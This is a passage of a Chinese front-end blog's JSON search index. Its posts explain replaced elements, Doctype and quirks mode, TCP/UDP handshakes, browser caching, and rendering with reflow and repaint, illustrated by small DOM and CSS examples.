5%83%E7%B4%A0/","excerpt":"置换元素","text":"置换元素 置换元素是指：浏览器根据元素的标签属性，来决定元素的显示内容 例如：浏览器根据&lt;img&gt;标签的src属性显示图片。根据type属性决定显示的表单输入控件是输入框还是按钮 置换元素在其显示中生成了框，这也就是有的内联元素能够设置宽高的原因 HTML中的置换元素：img、input、textarea、select、object。 这些元素为往往没有实际的内容，是一个空元素，就是说浏览器f12之后看不到标签里的内容 非置换元素除去上面的元素，浏览器中大多数元素都是不可置换元素。就是说其标签内容直接展示给浏览器 例如&lt;label&gt;标签，&lt;p&gt;标签里的内容会被直接展示给浏览器","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"CSS","slug":"技术/前端/CSS","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/CSS/"}],"tags":[]},{"title":"Doctype、严格模式与混杂模式","slug":"Doctype、严格模式与混杂模式","date":"2020-03-07T16:00:00.000Z","updated":"2024-05-25T04:21:30.275Z","comments":true,"path":"2020/03/08/Doctype、严格模式与混杂模式/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/08/Doctype%E3%80%81%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F/","excerpt":"Doctype的作用！DOCTYPE 是一个文档类型标记，是一种标准通用标记语言的文档类型声明，在 web 设计中用来说明你用的 XHTML 或者 HTML 是什么版本 HTML5 不基于 SGML，因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为 而HTML4.01基于SGML,所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型","text":"Doctype的作用！DOCTYPE 是一个文档类型标记，是一种标准通用标记语言的文档类型声明，在 web 设计中用来说明你用的 XHTML 或者 HTML 是什么版本 HTML5 不基于 SGML，因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为 而HTML4.01基于SGML,所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型 严格模式与混杂模式 严格模式，又称标准模式，是指浏览器按照W3C标准来解析代码，一种严格要求的DTD，排版和JS运作模式均是以该浏览器支持的最高标准运行。 混杂模式，又称怪异模式或者兼容模式，是指浏览器按照自己的方式来解析代码，页面以宽松的向后兼容的方式显示，就严格度上来说不如严格模式，但是模拟老式浏览器的行为可以防止站点无法工作。 区分两种模式重点在于文档的DTD： 如果文档中包含了严格的DOCTYPE，那么它一般以严格模式呈现。 如果文档中包含过渡DTD和URI的DOCTYPE，也以严格模式呈现，但有过渡DTD而没有URI，会导致文档以混杂模式呈现。 DOCTYPE不存在或者形式不正确或有误，文档以混杂模式呈现。 HTML5没有DTD，因此也就没有严格模式与混杂模式的区分，HTML5相对来说语法比较宽松。 两种模式的不同表现形式盒模型的高宽在标准的w3c模式下，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度。而在IE5.5及以下的浏览器及其他版本的混杂模式下，这个宽度和高度还包含了padding和border 可以设置行内元素的高宽.在严格模式下，给span等行内元素设置width和height都没有效果，但是在混杂模式下会生效 可以设置百分比高度在严格模式下，一个元素的高度是由它包含的内容来决定的，如果父元素没有设置高度，子元素设置一个百分比的高度是无效的。 margin:0 auto设置水平居中在IE下会失效用margin:0 auto在严格模式下可以使元素水平居中，但在混杂模式下却会失效，解决办法是用text-align 混杂模式下设置图片的padding会失效混杂模式Table的自提属性不能继承上层的设置混杂模式white-space:pre会失效","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"tcp与udp","slug":"tcp与udp","date":"2020-03-07T16:00:00.000Z","updated":"2024-05-25T04:21:29.796Z","comments":true,"path":"2020/03/08/tcp与udp/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/08/tcp%E4%B8%8Eudp/","excerpt":"TCP与UDP的区别 TCP 是面向连接的，UDP 是面向无连接的 UDP程序结构较简单 TCP 是面向字节流的，UDP 是基于数据报的 TCP 保证数据正确性，UDP 可能丢包 TCP 保证数据顺序，UDP 不保证","text":"TCP与UDP的区别 TCP 是面向连接的，UDP 是面向无连接的 UDP程序结构较简单 TCP 是面向字节流的，UDP 是基于数据报的 TCP 保证数据正确性，UDP 可能丢包 TCP 保证数据顺序，UDP 不保证 UDP——面向报文 UDP是一个面向报文的协议，从这个字面意思来理解的话就是，udp协议只是充当了一个报文的搬运工，不会对报文本身进行修改，例如拆分和拼接等操作 UDP的不可靠性 UDP是面向无连接的，也就是说在传输数据时，不需要和接收方确认建立和断开连接 UDP只负责搬运报文，不负责接收方有没有收到 UDP没有拥塞控制，收到多少报文就发送多少报文，不管接收端有没有能力接受 UDP的优点 高效：不需要复杂的首部字段，仅仅加一个UDP标识字段。 实时性好 UDP的缺点网络不好的情况下可能发生丢包 UDP的应用场景 网络直播 网络实时游戏 视频通话，网络电话 TCP——面向字节流报文格式 Sequence number（seq）序号，TCP把连接中发送的所有数据字节都编上一个序号，第一个字节的编号由本地随机产生；给字节编上序号后，就给每一个报文段指派一个序号；序列号seq就是这个报文段中的第一个字节的数据编号 Acknowledgement Number（ack）确认号，这个序号表示数据接收端期望接收的下一个字节的编号是多少，同时也表示上一个序号的数据已经收到 Window Size，窗口大小，表示还能接收多少字节的数据，用于流量控制 确认ACK：占1位，仅当ACK=1时，确认号字段才有效。ACK=0时，确认号无效。TCP 还规定在连接建立后传送的所有报文段都必须把 ACK 置为一 同步SYN：当SYN=1，ACK=0时，表示当前报文段是一个连接请求报文。当SYN=1，ACK=1时，表示当前报文段是一个同意建立连接的应答报文。因此，SYN=1表示这是一个连接请求，或连接接受报文。SYN这个标志位只有在TCP建产连接时才会被置1，握手完成后SYN标志位被置0。 终止FIN：用来释放一个连接。FIN=1表示：此报文段的发送方的数据已经发送完毕，并要求释放运输连接 PS：ACK、SYN和FIN这些大写的单词表示标志位，其值要么是1，要么是0；ack、seq小写的单词表示序号 tcp的三次握手第一次握手 客户端向服务端发送连接请求报文段。该报文段中包含自身的数据通讯初始序号。请求发送后，客户端便进入 SYN-SENT 状态x 表示客户端的数据通信初始序号。 第二次握手 服务端收到连接请求报文段后，如果同意连接，则会发送一个应答，该应答中也会包含自身的数据通讯初始序号，发送完成后便进入SYN-RECEIVED 状态。 第三次握手 当客户端收到连接同意的应答后，还要向服务端发送一个确认报文。客户端发完这个报文段后便进入ESTABLISHED状态，服务端收到这个应答后也进入 ESTABLISHED状态，此时连接建立成功 TCP四次挥手第一次挥手 客户端进程发出连接释放报文，并且停止发送数据。释放数据报文首部，FIN=1，其序列号为seq=u（等于前面已经传送过来的数据的最后一个字节的序号加1），此时，客户端进入FIN-WAIT-1（终止等待1）状态。 TCP规定，FIN报文段即使不携带数据，也要消耗一个序号。 第二次挥手 服务器收到连接释放报文，发出确认报文，ACK=1，ack=u+1，并且带上自己的序列号seq=v，此时，服务端就进入了CLOSE-WAIT（关闭等待）状态。即客户端已经没有数据要发送了，但是服务器若发送数据，客户端依然要接受。这个状态还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。 第三次挥手 服务器将最后的数据发送完毕后，就向客户端发送连接释放报文，FIN=1，ack=u+1，由于在半关闭状态，服务器很可能又发送了一些数据，假定此时的序列号为seq=w，此时，服务器就进入了LAST-ACK（最后确认）状态，等待客户端的确认。 第四次挥手 客户端收到服务器的连接释放报文后，必须发出确认，ACK=1，ack=w+1，而自己的序列号是seq=u+1，此时，客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2∗∗MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。 为了保证 B 能收到 A 的确认应答。若 A 发完确认应答后直接进入 CLOSED 状态，如果确认应答因为网络问题一直没有到达，那么会造成 B 不能正常关闭 常见问题 为什么连接的时候是三次握手，关闭的时候却是四次握手？答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。 为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。在Client发送出最后的ACK回复，但该ACK可能丢失。Server如果没有收到ACK，将不断重复发送FIN片段。所以Client不能立即关闭，它必须确认Server接收到了该ACK。Client会在发送出ACK之后进入到TIME_WAIT状态。Client会设置一个计时器，等待2MSL的时间。如果在该时间内再次收到FIN，那么Client会重发ACK并再次等待2MSL。否则Client推断ACK已经被成功接收，则结束TCP连接。 如果已经建立了连接，但是客户端突然出现故障了怎么办TCP还设有一个保活计时器，显然，客户端如果出现故障，服务器不能一直等下去，白白浪费资源。服务器每收到一次客户端的请求后都会重新复位这个计时器，时间通常是设置为2小时，若两小时还没有收到客户端的任何数据，服务器就会发送一个探测报文段，以后每隔75秒钟发送一次。若一连发送10个探测报文仍然没反应，服务器就认为客户端出了故障，接着就关闭连接。 为什么是三次握手而不是两次防止失效的连接请求报文段被服务端接收，从而产生错误 可以想象如下场景。客户端发送了一个连接请求 A，但是因为网络原因造成了超时，这时 TCP 会启动超时重传的机制再次发送一个连接请求 B。此时请求顺利到达服务端，服务端应答完就建立了请求。如果连接请求 A 在两端关闭后终于抵达了服务端，那么这时服务端会认为客户端又需要建立 TCP 连接，从而应答了该请求并进入 ESTABLISHED 状态。此时客户端其实是 CLOSED 状态，那么就会导致服务端一直等待，造成资源的浪费","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"计算机网络","slug":"技术/计算机通识/计算机网络","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"浏览器的缓存与存储","slug":"浏览器的缓存与存储","date":"2020-03-04T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/03/05/浏览器的缓存与存储/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E4%B8%8E%E5%AD%98%E5%82%A8/","excerpt":"浏览器的缓存机制","text":"浏览器的缓存机制 当我们在浏览器网址栏中输入url并点击访问后，浏览器会首先检查并读取缓存，那么对于各种缓存，浏览器在读取时有如下优先级： Service Worker Memory Cache Disk Cache 网络请求 上述Memory Cache和 Disk Cache就是存储在不同位置的缓存 Service Worker Service workers 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API使用 Service Worker的话，传输协议必须为 HTTPS。因为 Service Worker 中涉及到请求拦截，所以必须使用 HTTPS 协议来保障安全 Service Worker的重头戏，也是 Service Worker 能够实现的最主要的功能——静态资源缓存。一般情况下，如果用户在没有联网的情况下打开网页，浏览器就无法下载展示页面效果所必须的资源，页面也就无法正常的展示出来。我们可以使用 Service Worker 配合 CacheStroage 来实现对静态资源的缓存service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的 Service Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。以下是这个步骤的实现： Service Worker的使用是一个篇幅较长的话题，可以移步这篇博客： Service Worker ——这应该是一个挺全面的整理 Memory Cachememory cache 是内存中的缓存，(与之相对 disk cache 就是硬盘上的缓存)。按照操作系统的常理：先读内存，再读硬盘。disk cache 将在后面介绍 (因为它的优先级更低一些)，这里先讨论 memory cache。 几乎所有的网络请求资源都会被浏览器自动加入到 memory cache 中。但是也正因为数量很大但是浏览器占用的内存不能无限扩大这样两个因素，memory cache 注定只能是个“短期存储”。常规情况下，浏览器的 TAB 关闭后该次浏览的 memory cache 便告失效 (为了给其他 TAB 腾出位置)。而如果极端情况下 (例如一个页面的缓存就占用了超级多的内存)，那可能在 TAB 没关闭之前，排在前面的缓存就已经失效了。 刚才提过，几乎所有的请求资源 都能进入 memory cache，这里细分一下主要有两块： preloader。如果你对这个机制不太了解，这里做一个简单的介绍。熟悉浏览器处理流程的同学们应该了解，在浏览器打开网页的过程中，会先请求 HTML 然后解析。之后如果浏览器发现了 js, css 等需要解析和执行的资源时，它会使用 CPU 资源对它们进行解析和执行。在古老的年代(大约 2007 年以前)，“请求 js/css - 解析执行 - 请求下一个 js/css - 解析执行下一个 js/css” 这样的“串行”操作模式在每次打开页面之前进行着。很明显在解析执行的时候，网络请求是空闲的，这就有了发挥的空间：我们能不能一边解析执行 js/css，一边去请求下一个(或下一批)资源呢？这就是 preloader 要做的事情。不过 preloader 没有一个官方标准，所以每个浏览器的处理都略有区别。例如有些浏览器还会下载 css 中的 @import 内容或者 &lt;video&gt; 的 poster等。而这些被 preloader 请求过来的资源就会被放入 memory cache 中，供之后的解析执行操作使用。 preload (虽然看上去和刚才的 preloader 就差了俩字母)。实际上这个大家应该更加熟悉一些，例如 &lt;link rel=&quot;preload&quot;&gt;。这些显式指定的预加载资源，也会被放入 memory cache 中。 memory cache 机制保证了一个页面中如果有两个相同的请求 (例如两个 src 相同的 &lt;img&gt;，两个 href 相同的 &lt;link&gt;) 都实际只会被请求最多一次，避免浪费。 不过在匹配缓存时，除了匹配完全相同的 URL 之外，还会比对他们的类型，CORS 中的域名规则等。因此一个作为脚本 (script) 类型被缓存的资源是不能用在图片 (image) 类型的请求中的，即便他们 src 相等。 在从 memory cache 获取缓存内容时，浏览器会忽视例如 max-age=0, no-cache 等头部配置。例如页面上存在几个相同 src 的图片，即便它们可能被设置为不缓存，但依然会从 memory cache 中读取。这是因为 memory cache 只是短期使用，大部分情况生命周期只有一次浏览而已。而 max-age=0 在语义上普遍被解读为“不要在下次浏览时使用”，所以和 memory cache 并不冲突。 但如果站长是真心不想让一个资源进入缓存，就连短期也不行，那就需要使用 no-store。存在这个头部配置的话，即便是 memory cache 也不会存储，自然也不会从中读取了 disk cachedisk cache 也叫 HTTP cache，顾名思义是存储在硬盘上的缓存，因此它是持久存储的，是实际存在于文件系统中的。而且它允许相同的资源在跨会话，甚至跨站点的情况下使用，例如两个站点都使用了同一张图片。 disk cache 会严格根据 HTTP 头信息中的各类字段来判定哪些资源可以缓存，哪些资源不可以缓存；哪些资源是仍然可用的，哪些资源是过时需要重新请求的。当命中缓存之后，浏览器会从硬盘中读取资源，虽然比起从内存中读取慢了一些，但比起网络请求还是快了不少的。绝大部分的缓存都来自 disk cache。 这一部分的缓存，又分为强缓存和协商缓存，两者都是由http的协议头部字段来控制 关于 HTTP 的协议头中的缓存字段，在http这一博客的缓存部分做了详细介绍 浏览器的行为所谓浏览器的行为，指的就是用户在浏览器如何操作时，会触发怎样的缓存策略。主要有 3 种： 打开网页，地址栏输入地址： 浏览器发现该资源已经缓存了而且没有过期（通过Expires头部或者Cache-Control头部），没有跟服务器确认，而是直接使用了浏览器缓存的内容（disk cache强缓存），否则进行网络请求 普通刷新 (F5)：因为 TAB 并没有关闭，因此 memory cache 是可用的，会被优先使用(如果匹配的话)。其次才是 disk cache协商缓存。 强制刷新 (Ctrl + F5)：浏览器不使用缓存，因此发送的请求头部均带有 Cache-control: no-cache(为了兼容，还带了 Pragma: no-cache)。服务器直接返回 200 和最新内容 实现存储的几种方式cookie，localStorage，sessionStorage，indexDB 从上表可以看到，cookie 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 localStorage 和 sessionStorage 。对于不怎么改变的数据尽量使用 localStorage 存储，否则可以用 sessionStorage存储 对于 cookie 来说，我们还需要注意安全性。所以还记得我们在跨域一章中就提到：一旦同源限制策略被触发，Cookie、LocalStorage和IndexDB无法读取；","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"关于浏览器的一些原理","slug":"关于浏览器的一些原理","date":"2020-03-03T16:00:00.000Z","updated":"2024-05-25T04:21:29.712Z","comments":true,"path":"2020/03/04/关于浏览器的一些原理/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/04/%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8E%9F%E7%90%86/","excerpt":"浏览器的内核","text":"浏览器的内核 一个完整的浏览器内核主要分成两部分：渲染引擎(layout engineer或Rendering Engine)和JS引擎 渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核 JS引擎则：解析和执行javascript来实现网页的动态效果 最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎， 到如今。我们所指的浏览器内核，一般就是指渲染引擎（下文所指的内核，若无特殊提示，则代表渲染引擎） 渲染引擎目前使用的主流浏览器有五个：Internet Explorer、 Firefox、 Safari、 Chrome 和 Opera，他们使用的渲染引擎分别如下： Trident引擎：Internet Explorer Webkit引擎：Chrome（28版本后基于blink，blink是webkit的一个分支）和Safari Gecko 英[ˈɡekəʊ]引擎：Firefox Presto引擎：早期Opera采用，后用webkit引擎 浏览器内核渲染机制 处理 HTML 并构建 DOM 树。 处理 CSS 构建 CSSOM 树。 将 DOM 与 CSSOM 合并成一个渲染树。 Layout(回流):根据生成的渲染树，进行回流(Layout)，得到节点的几何信息（位置，大小） Painting(重绘):根据渲染树以及回流得到的几何信息，得到节点的绝对像素 Display:将像素发送给GPU，展示在页面上。（这一步其实还有很多内容，比如会在GPU将多个合成层合并为同一个层，并展示在页面中。而css3硬件加速的原理则是新建合成层） 构建DOM树 当我们打开一个网页时，浏览器都会去请求对应的 HTML 文件。虽然平时我们写代码时都会分为 JS、CSS、HTML 文件，也就是字符串，但是计算机硬件是不理解这些字符串的，所以在网络中传输的内容其实都是 0 和 1 这些字节数据。当浏览器接收到这些字节数据以后，它会将这些字节数据转换为字符串，也就是我们写的代码。 当数据转换为字符串以后，浏览器会先将这些字符串通过词法分析转换为标记（token），这一过程在词法分析中叫做标记化（tokenization） 简单来说，标记还是字符串，是构成代码的最小单位。这一过程会将代码分拆成一块块，并给这些内容打上标记，便于理解这些最小单位的代码是什么意思 当结束标记化后，这些标记会紧接着转换为 Node，最后这些 Node 会根据不同 Node 之前的联系构建为一颗 DOM 树 构建CSSOM树这一过程大体流程和上面的类似 在这一过程中，浏览器会确定下每一个节点的样式到底是什么，并且这一过程其实是很消耗资源的。因为样式你可以自行设置给某个节点，也可以通过继承获得。在这一过程中，浏览器得递归 CSSOM 树，然后确定具体的元素到底是什么样式 1234567891011&lt;div&gt; &lt;a&gt; &lt;span&gt;&lt;/span&gt; &lt;/a&gt;&lt;/div&gt;&lt;style&gt; span &#123; color: red; &#125; div &gt; a &gt; span &#123; color: red; &#125;&lt;/style&gt; 对于第一种设置样式的方式来说，浏览器只需要找到页面中所有的 span 标签然后设置颜色，但是对于第二种设置样式的方式来说，浏览器首先需要找到所有的 span 标签，然后找到 span 标签上的 a 标签，最后再去找到 div 标签，然后给符合这种条件的 span 标签设置颜色，这样的递归过程就很复杂。 在构建 CSSOM 树时，会阻塞渲染，直至 CSSOM 树构建完成，所以我们应该尽可能的避免写过于具体的 CSS 选择器，然后对于 HTML 来说也尽量少的添加无意义标签，保证层级扁平 构建渲染树 从DOM树的根节点开始遍历每个可见节点，例如css的display：none就是个不可见节点，不会进入渲染树。 对于每个可见的节点，找到CSSOM树中对应的规则，并应用它们。 根据每个可见节点以及其对应的样式，组合生成渲染树。 第一步中，既然说到了要遍历可见的节点，那么我们得先知道，什么节点是不可见的。不可见的节点包括： 一些不会渲染输出的节点，比如script、meta、link等。 一些通过css进行隐藏的节点。比如display:none。注意，利用visibility和opacity隐藏的节点，还是会显示在渲染树上的。只有display:none的节点才不会显示在渲染树上。 总结：渲染树只包含可见的节点 回流与重绘回流前面我们通过构造渲染树，我们将可见DOM节点以及它对应的样式结合起来，可是我们还需要计算它们在设备视口(viewport)内的确切位置和大小，这个计算的阶段就是回流。 重绘最终，我们通过构造渲染树和回流阶段，我们知道了哪些节点是可见的，以及可见节点的样式和具体的几何信息(位置、大小)，那么我们就可以将渲染树的每个节点都转换为屏幕上的实际像素，这个阶段就叫做重绘节点。 回流与重绘的触发机制我们前面知道了，回流这一阶段主要是计算节点的位置和几何信息，那么当页面布局和几何信息发生变化的时候，就需要回流。比如以下情况： 添加或删除可见的DOM元素 元素的位置发生变化 元素的尺寸发生变化（包括外边距、内边框、边框大小、高度和宽度等） 内容发生变化，比如文本变化或图片被另一个不同尺寸的图片所替代。 页面一开始渲染的时候（这肯定避免不了） 浏览器的窗口尺寸变化（因为回流是根据视口的大小来计算元素的位置和大小的） 注意：回流一定会触发重绘，而重绘不一定会回流 根据改变的范围和程度，渲染树中或大或小的部分需要重新计算，有些改变会触发整个页面的重排，比如，滚动条出现的时候或者修改了根节点。 现代的浏览器都是很聪明的，由于每次重排都会造成额外的计算消耗，因此大多数浏览器都会通过队列化修改并批量执行来优化重排过程。浏览器会将修改操作放入到队列里，直到过了一段时间或者操作达到了一个阈值，才清空队列。但是！当你获取布局信息的操作的时候，会强制队列刷新，比如当你访问以下属性或者使用以下方法： offsetTop、offsetLeft、offsetWidth、offsetHeightscrollTop、scrollLeft、scrollWidth、scrollHeightclientTop、clientLeft、clientWidth、clientHeightgetComputedStyle()getBoundingClientRect 以上属性和方法都需要返回最新的布局信息，因此浏览器不得不清空队列，触发回流重绘来返回正确的值。因此，我们在修改样式的时候，最好避免使用上面列出的属性，他们都会刷新渲染队列。如果要使用它们，最好将值缓存起来。 减少回流与重绘使用cssText或者className一次性改变属性1234const el = document.getElementById('test');el.style.padding = '5px';el.style.borderLeft = '1px';el.style.borderRight = '2px'; 替换为 12const el = document.getElementById('test');el.style.cssText += 'border-left: 1px; border-right: 2px; padding: 5px;'; 批量操作时先使元素脱离文档流再修改当我们进行DOM操作，特别是批量操作时，可以使用如下步骤： 使元素脱离文档流 对其进行多次修改 将元素带回到文档中。 对于批量操作，避免在循环内部一次又一次地进行dom操作，尽量将多次dom操作合并为一次 1234567891011function appendDataToElement(appendToElement, data) &#123; let li; for (let i = 0; i &lt; data.length; i++) &#123; li = document.createElement('li'); li.textContent = 'text'; appendToElement.appendChild(li); &#125;&#125;const ul = document.getElementById('list');appendDataToElement(ul, data); 替换为： 123456789101112function appendDataToElement(appendToElement, data) &#123; let li; for (let i = 0; i &lt; data.length; i++) &#123; li = document.createElement('li'); li.textContent = 'text'; appendToElement.appendChild(li); &#125;&#125;const ul = document.getElementById('list');ul.style.display = 'none';appendDataToElement(ul, data);ul.style.display = 'block'; 然而对于上述那种情况，实验结果不是很理想。 原因：原因其实上面也说过了，浏览器会使用队列来储存多次修改，进行优化，所以对这个优化方案，我们其实不用优先考虑。 对于复杂动画效果,使用绝对定位让其脱离文档流对于复杂动画效果，由于会经常的引起回流重绘，因此，我们可以使用绝对定位，让它脱离文档流。否则会引起父元素以及后续元素频繁的回流 使用 visibility 替换display: none ，因为前者只会引起重绘，后者会引发回流（改变了布局）css3硬件加速比起考虑如何减少回流重绘，我们更期望的是，根本不要回流重绘。这个时候，css3硬件加速就闪亮登场啦！！ 划重点：使用css3硬件加速，可以让transform、opacity、filters这些动画不会引起回流重绘 。但是对于动画的其它属性，比如background-color这些，还是会引起回流重绘的，不过它还是可以提升这些动画的性能。 常见的触发硬件加速的css属性： transform opacity filters Will-change 缺点：占用较大，会有性能问题 尽量避免使用table布局一个很小的改动都有可能造成table布局的回流 将频繁重绘或者回流的节点设置为图层图层能够阻止该节点的渲染行为影响别的节点。比如对于 video 标签来说，浏览器会自动将该节点变为图层 一般来说，可以把普通文档流看成一个图层。特定的属性可以生成一个新的图层。不同的图层渲染互不影响，所以对于某些频繁需要渲染的建议单独生成一个新图层，提高性能。但也不能生成过多的图层，会引起反作用 通过以下几个常用属性可以生成新图层 3D变换：translate3d、translateZ will-change video、iframe 标签 通过动画实现的 opacity 动画转换 position: fixed 回流重绘与event loop 当 Eventloop 执行完 Microtasks 后，会判断 document 是否需要更新，因为浏览器是 60Hz 的刷新率，每 16.6ms 才会更新一次。 然后判断是否有 resize 或者 scroll 事件，有的话会去触发事件，所以 resize 和 scroll 事件也是至少 16ms 才会触发一次，自带节流功能。 判断是否触发了 media query 更新动画并且发送事件 判断是否有全屏操作事件 执行 requestAnimationFrame回调 执行 IntersectionObserver 回调，该方法用于判断元素是否可见，可以用于懒加载上，但是兼容性不好 更新界面 以上就是一帧中可能会做的事情。如果在一帧中有空闲时间，就会去执行 requestIdleCallback回调 什么情况阻塞渲染 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染，换句话说，构建DOM树和CSS树都会阻塞渲染。如果你想渲染的越快，你越应该降低一开始需要渲染的文件大小，并且扁平层级，优化选择器。 然后当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。也就是说，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS文件，这也是都建议将 script 标签放在 body 标签底部的原因。 当然在当下，并不是说 script 标签必须放在底部，因为你可以给 script 标签添加 defer 或者 async 属性。 当 script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script标签放在任意位置。 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染 浏览器从输入url到显示发生了什么 在浏览器地址栏输入URL 浏览器查看缓存，如果请求资源在缓存中并且未过期，跳转到转码步骤 浏览器对于缓存的读取是有优先级的（关于缓存，另一篇博客单独讲述） Service Worker Memory Cache（内存中的缓存） Disk Cache（硬盘中的缓存） 网络请求 如果资源未缓存（没有Memory Cache），发起新请求 检测是否有缓存（Disk Cache），如果有，检验是否未过期，足够新鲜直接提供给客户端，否则与服务器进行验证。 这里的检验缓存是否过期通常有两个HTTP头进行控制Expires和Cache-Control： HTTP1.0提供Expires，值为一个绝对时间表示缓存到期时间 HTTP1.1增加了Cache-Control: max-age=,值为以秒为单位的有效时间 浏览器解析URL获取协议，主机，端口，path 浏览器组装一个HTTP（GET）请求报文 浏览器获取主机ip地址，过程如下： 浏览器缓存 本机缓存 hosts文件 路由器缓存 运营商 DNS缓存 DNS递归查询（可能存在负载均衡导致每次IP不一样） 打开一个socket与目标IP地址，端口建立TCP链接，三次握手如下： 客户端发送一个TCP的SYN=1，Seq=X的包到服务器端口 服务器发回SYN=1， ACK=X+1， Seq=Y的响应包 客户端发送ACK=Y+1， Seq=Z（TCP三次握手四次挥手，会在另一篇博客单独讲述） TCP链接建立后发送HTTP请求 服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用HTTP Host头部判断请求的服务程序服务器检查HTTP请求头是否包含缓存验证信息如果验证缓存新鲜，返回304等对应状态码 处理程序读取完整请求并准备HTTP响应，可能需要查询数据库等操作 服务器将响应报文通过TCP连接发送回浏览器 浏览器接收HTTP响应，然后根据情况选择关闭TCP连接或者保留重用，关闭TCP连接的四次握手如下： 主动方发送Fin=1， Ack=Z， Seq= X报文 被动方发送ACK=X+1， Seq=Z报文 被动方发送Fin=1， ACK=X， Seq=Y报文 主动方发送ACK=Y， Seq=X报文 浏览器检查响应状态吗：是否为1XX，3XX， 4XX， 5XX，这些情况处理与2XX不同 如果资源可缓存，进行缓存 对响应进行解码（例如gzip压缩） 根据资源类型决定如何处理（假设资源为HTML文档） 